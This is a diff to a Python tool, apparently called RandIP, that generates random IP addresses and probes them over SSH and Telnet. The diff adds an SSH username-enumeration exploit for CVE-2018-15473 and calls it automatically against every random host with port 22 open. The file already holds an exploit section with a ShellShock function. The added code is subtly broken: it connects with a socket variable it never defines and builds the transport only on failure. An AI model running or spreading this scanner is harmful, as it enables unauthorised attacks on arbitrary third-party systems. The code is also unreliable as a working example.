@@ -1,7 +1,7 @@
 #RandIP 1.1 Stable#
 #Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
-import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys
+import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys, logging
 from random import randint
 from stem.util import term
 #from PyQt4.QtGui import *
@@ -155,6 +155,36 @@ def ShellShock():
 	except:
 		print('Exploit failed...\n')
 		pass
+def SSHenum():
+	class InvalidUsername(Exception):
+		pass
+	def add_boolean(*args, **kwargs):
+		pass
+	old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+	def service_accept(*args, **kwargs):
+		paramiko.message.Message.add_boolean = add_boolean
+		return old_service_accept(*args, **kwargs)
+	def userauth_failure(*args, **kwargs):
+		raise InvalidUsername()
+	print('Using CVE:2018-15473')
+	SSHsocket = socket.socket()
+	try:
+		SSHsock.connect((address, 22))
+	except socket.error:
+		print '[-] Failed to connect'
+		transport = paramiko.transport.Transport(SSHsock)
+	try:
+		transport.start_client()
+	except paramiko.ssh_exception.SSHException:
+		print '[-] Failed to negotiate SSH transport'
+	try:
+		transport.auth_publickey('root', paramiko.RSAKey.generate(2048))
+	except InvalidUsername:
+		print '[*] Invalid username'
+		pass
+	except paramiko.ssh_exception.AuthenticationException:
+		print '[+] Valid username'
+		pass
 #End Of Exploit Container
 #########################################################################
 def find_service_name():
@@ -208,6 +238,10 @@ def TelnetConnect():
 		print((EOFError, address))
 		d.append(address)
 		pass
+	except exceptions.AttributeError:
+		telend=time.clock()
+		totaltime = telend - telnettime
+		print
 	except KeyboardInterrupt:
 		WriteLog()
 #				break
@@ -299,6 +333,7 @@ for address in randip():
 			print(('Starting SSH Attempt on %s' % address))
 			if SSHio == 1:
 				SSHConnect()
+				SSHenum()
 			elif SSHio == 0:
 				print('SSH port not open...skipping\n')
 #Custom Exploits
